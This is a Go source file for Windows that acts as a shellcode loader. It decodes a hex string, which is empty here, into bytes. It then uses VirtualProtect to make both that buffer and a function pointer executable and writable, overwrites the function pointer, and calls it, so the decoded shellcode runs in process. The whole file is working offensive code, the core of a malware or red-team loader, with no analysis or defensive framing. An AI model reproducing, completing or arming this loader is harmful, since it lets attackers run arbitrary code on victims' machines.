package main

import (
	"syscall"
	"unsafe"
	"encoding/hex"
	"os"
)

var (
	Kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
	procVirtualProtect = Kernel32DLL.NewProc("VirtualProtect")
)

//var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	//LPVOID	VirtualAlloc(
	// LPVOID	lpAddress,
	// SIZE_T	dwSize,
	// DWORD	flAllocationType,
	// DWORD	flProtect
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func Run(fire []byte) {
	// TODO need a Go safe fork
	// Make a function ptr
	f := func() {}

	// Change permissions on f function ptr
	var oldfperms uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("Call to VirtualProtect failed!")
	}

	// Override function ptr
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&fire))

	// Change permissions on shellcode string data
	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&fire))), uintptr(len(fire)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("Call to VirtualProtect failed!")
	}

	// Call the function ptr it
	f()
}

func main() {
	slug := ""
	fire, err := hex.DecodeString(slug)
	if err != nil {
		os.Exit(1)
	}
	Run(fire)
}
